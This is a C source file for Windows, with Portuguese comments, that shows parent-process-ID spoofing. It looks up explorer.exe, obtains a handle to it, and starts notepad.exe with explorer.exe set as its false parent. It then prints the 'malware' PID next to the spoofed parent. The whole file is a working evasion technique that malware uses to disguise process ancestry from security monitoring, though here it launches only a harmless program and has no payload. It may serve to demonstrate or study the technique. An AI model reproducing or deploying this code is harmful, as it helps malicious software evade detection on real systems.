#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// Uso explícito das versões 'W' (Wide/Unicode) para compatibilidade com const wchar_t*
DWORD GetPidByname(const wchar_t* pName) {
    PROCESSENTRY32W pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32W);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(snapshot, &pEntry) == TRUE) {
        // CORREÇÃO: Uso de do-while para não pular o primeiro processo
        do {
            if (wcscmp(pEntry.szExeFile, pName) == 0) {
                CloseHandle(snapshot); // CORREÇÃO: Fechar o handle antes de retornar
                return pEntry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &pEntry) == TRUE);
    }

    CloseHandle(snapshot);
    return 0; // CORREÇÃO: Retornar 0 caso não encontre
}

int main(void) {
    // CORREÇÃO: Inicialização correta da estrutura STARTUPINFOEXA
    STARTUPINFOEXA info;
    ZeroMemory(&info, sizeof(STARTUPINFOEXA));
    info.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    PROCESS_INFORMATION processInfo;
    ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hExplorerProcess = NULL;
    DWORD dwExplorerPid = 0;

    dwExplorerPid = GetPidByname(L"explorer.exe");

    if (dwExplorerPid == 0) {
        dwExplorerPid = GetCurrentProcessId();
    }

    // 1. Obter o tamanho necessário para a lista de atributos
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    
    // 2. Inicializar a lista
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // PROCESS_CREATE_PROCESS é o acesso mínimo necessário para PPID Spoofing
    hExplorerProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwExplorerPid);
    
    if (hExplorerProcess != NULL) {
        UpdateProcThreadAttribute(
            pAttributeList, 
            0, 
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
            &hExplorerProcess, 
            sizeof(HANDLE), 
            NULL, 
            NULL
        );
    }

    info.lpAttributeList = pAttributeList;

    // CORREÇÃO: CreateProcess precisa de uma string gravável (array de chars)
    char cmd[] = "notepad.exe";

    // CORREÇÃO: Removidos os argumentos extras (placeholders) que causavam erro
    BOOL success = CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &info.StartupInfo,
        &processInfo
    );

    if (success) {
        printf("Malware PID: %d\n", GetCurrentProcessId());
        printf("Explorer PID (Pai Falso): %d\n", dwExplorerPid);
        printf("Notepad PID: %d\n", processInfo.dwProcessId);

        // CORREÇÃO: Boa prática fechar handles gerados pelo CreateProcess
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
    } else {
        printf("Erro ao criar processo. Erro: %d\n", GetLastError());
    }

    Sleep(5000);

    // CORREÇÃO: Erro de digitação corrigido e limpeza de memória Heap
    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    
    if (hExplorerProcess) {
        CloseHandle(hExplorerProcess);
    }

    return 0;
}
